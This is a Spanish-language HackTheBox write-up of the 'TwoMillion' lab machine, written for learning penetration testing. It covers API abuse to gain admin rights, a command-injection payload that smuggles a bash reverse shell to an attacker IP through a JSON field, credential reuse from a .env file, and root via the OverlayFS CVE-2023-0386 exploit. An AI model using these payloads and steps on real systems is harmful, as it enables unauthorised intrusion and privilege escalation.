# TwoMillion – HackTheBox Write-up

## 📝 Descripción
TwoMillion fue una máquina Linux de dificultad **Medium**, lanzada en conmemoración de los **2 millones de usuarios** en HackTheBox.  
La explotación involucra enumeración de servicios, abuso de la API, command injection y escalada de privilegios mediante un CVE real de kernel (**OverlayFS – CVE-2023-0386**).

---

## 🔎 Enumeración

### Escaneo de puertos
```bash
nmap -p- --min-rate 10000 10.10.11.221
nmap -sCV -p22,80 10.10.11.221
```

Servicios encontrados:
- **22/tcp** → OpenSSH
- **80/tcp** → HTTP con redirección a `2million.htb`

### Resolviendo host
```bash
echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
```

---

## 🌐 Explotación Web

Al visitar `http://2million.htb` se encuentra un portal con sección **/invite**.  
Analizando `js/inviteapi.min.js` descubrimos la función `makeInviteCode()`.

#### Generando el código de invitación
```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq -r '.data.data' | tr 'a-zA-Z' 'n-za-mN-ZA-M'

curl -s -X POST http://2million.htb/api/v1/invite/generate | jq -r '.data.code' | base64 -d
```

Con el código generado se completa el registro y login en el portal.

---

## 🔐 Escalada a Admin (API Abuse)

Enumerando endpoints de la API con la cookie de sesión (`PHPSESSID`):

```bash
curl -s http://2million.htb/api/v1 -H "Cookie: PHPSESSID=<ID>" | jq .
```

Se observa el endpoint vulnerable:
```
PUT /api/v1/admin/settings/update
```

Este permite modificar parámetros de usuario y establecer privilegios de administrador:

```bash
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update"   -H "Content-Type: application/json"   -H "Cookie: PHPSESSID=<ID>"   -d '{"email":"jc@htb.local","is_admin":1}'
```

---

## 💻 Command Injection → Shell (www-data)

Ya como admin, el endpoint:
```
POST /api/v1/admin/vpn/generate
```
es vulnerable a inyección en el campo `username`.

Listener:
```bash
nc -lvnp 9001
```

Payload:
```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate"   -H "Content-Type: application/json"   -H "Cookie: PHPSESSID=<ID>"   -d '{"username":"; bash -c \"bash -i >& /dev/tcp/10.10.14.6/9001 0>&1\"; #"}'
```

Shell obtenida como **www-data**.

---

## 🔑 User Flag

Dentro de `/var/www/html/.env` se encuentran credenciales de base de datos:

```
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Probadas por SSH:
```bash
ssh admin@2million.htb
```

Con ellas se accede como **admin** y se lee `user.txt`.

---

## ⚡ Root – CVE-2023-0386 (OverlayFS)

En `/var/mail/admin` aparece un correo advirtiendo sobre vulnerabilidades en **OverlayFS**.

Se transfiere el PoC del CVE-2023-0386, se compila y ejecuta:

```bash
gcc exp.c -o exp -lcap
./fuse ./ovlcap/lower ./gc &
./exp
```

Esto asigna `cap_setuid+ep` a `/bin/bash`.  
Verificación:
```bash
getcap /bin/bash
```

Shell como root:
```bash
bash -p
id
cat /root/root.txt
```

---

## 📌 Conclusión

TwoMillion es una máquina que refleja un flujo de ataque completo:
1. **Reconocimiento** y descubrimiento de endpoints ocultos.  
2. **Abuso de APIs REST** para elevar privilegios lógicos.  
3. **Command Injection** para ganar acceso al sistema.  
4. **Credential reuse** para pivotear a otro usuario.  
5. **Explotación de kernel (OverlayFS CVE-2023-0386)** para root.  

Un reto entretenido que combina pentesting web y explotación local, cerrando con una vulnerabilidad real de Linux.

---

✍️ *Write-up realizado por [Juan Cruz Castro](https://github.com/juanC200023)*
